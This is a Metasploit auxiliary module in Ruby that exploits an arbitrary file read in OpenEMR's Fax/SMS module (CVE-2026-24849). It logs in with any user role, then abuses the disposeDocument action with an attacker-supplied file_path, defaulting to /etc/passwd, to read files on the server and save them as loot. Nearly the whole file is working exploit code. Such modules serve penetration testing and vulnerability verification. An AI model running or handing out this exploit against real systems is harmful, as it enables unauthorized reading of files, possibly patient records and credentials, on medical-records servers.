class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'OpenEMR FaxSMS disposeDocument() Arbitrary File Read',
        'Description'    => %q{
          The OpenEMR Fax/SMS custom module dispatches the _ACTION_COMMAND
          request parameter to any method on the resolved provider class via
          method_exists()/call_user_func(), with no role or permission check
          anywhere in the path. Any authenticated user, regardless of role,
          can invoke EtherFaxActions::disposeDocument() with an
          attacker-controlled file_path parameter to read arbitrary files
          as the web server user.
        },
        'Author'         => [
          'doany1',              # original public PoC / discovery
          'Anonymous Author',     # identity withheld for blind review
        ],
        'References'     => [
          ['CVE', '2026-24849'],
          ['URL', 'https://github.com/openemr/openemr/security/advisories/GHSA-w6vc-hx2x-48pc'],
        ],
        'DisclosureDate' => '2026-06-06',
        'License'        => MSF_LICENSE,
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS],
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to OpenEMR', '/']),
      OptString.new('SITE',      [true, 'OpenEMR site id', 'default']),
      OptString.new('USERNAME',  [true, 'OpenEMR username (any role works)', 'admin']),
      OptString.new('PASSWORD',  [true, 'OpenEMR password', '']),
      OptString.new('FILE_PATH', [true, 'Absolute path of the file to read', '/etc/passwd']),
      Opt::RHOSTS('127.0.0.1'),
      Opt::RPORT(8080),
    ])
  end

  def base
    normalize_uri(target_uri.path)
  end

  def do_login
    site = datastore['SITE']

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(base, 'interface', 'login', 'login.php'),
      'vars_get' => { 'site' => site }
    )

    cookie = res ? res.get_cookies : ''

    post_data = {
      'new_login_session_management' => '1',
      'authProvider'                 => 'Default',
      'authUser'                     => datastore['USERNAME'],
      'clearPass'                    => datastore['PASSWORD'],
      'languageChoice'               => '1',
    }

    if res && res.body =~ /csrf_token_form.*?value=["']([^"']+)["']/m
      post_data['csrf_token_form'] = ::Regexp.last_match(1)
    end

    res2 = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(base, 'interface', 'main', 'main_screen.php'),
      'vars_get'  => { 'auth' => 'login', 'site' => site },
      'vars_post' => post_data,
      'cookie'    => cookie
    )

    new_cookie = res2 ? res2.get_cookies : ''
    cookie = new_cookie.empty? ? cookie : new_cookie

    cookie
  end

  def check
    cookie = do_login

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(base, 'interface', 'modules', 'custom_modules', 'oe-module-faxsms', 'index.php'),
      'vars_get' => {
        'site'            => datastore['SITE'],
        'type'            => 'fax',
        '_ACTION_COMMAND' => 'disposeDocument',
        'file_path'       => '/etc/hostname',
        'action'          => 'download',
      },
      'cookie'   => cookie
    )

    if res && res.code == 200 && !res.body.to_s.include?('login_screen.php') && !res.body.to_s.strip.empty?
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def run
    cookie = do_login

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(base, 'interface', 'modules', 'custom_modules', 'oe-module-faxsms', 'index.php'),
      'vars_get' => {
        'site'            => datastore['SITE'],
        'type'            => 'fax',
        '_ACTION_COMMAND' => 'disposeDocument',
        'file_path'       => datastore['FILE_PATH'],
        'action'          => 'download',
      },
      'cookie'   => cookie
    )

    if res.nil?
      print_error('No response from target')
      return
    end

    if res.body.include?('login_screen.php')
      print_error('Login failed - check USERNAME/PASSWORD/SITE')
      return
    end

    if res.body.include?('Problem with download')
      print_error("File not found or not readable: #{datastore['FILE_PATH']}")
      return
    end

    if res.body.to_s.strip.empty?
      print_error('Empty response - file was not read (target likely patched or blocked the request)')
      return
    end

    print_good("Read #{res.body.length} bytes from #{datastore['FILE_PATH']}")
    print_line(res.body)
    loot_path = store_loot('openemr.faxsms.fileread', 'text/plain', rhost, res.body, datastore['FILE_PATH'])
    print_status("Saved to #{loot_path}")
  end
end
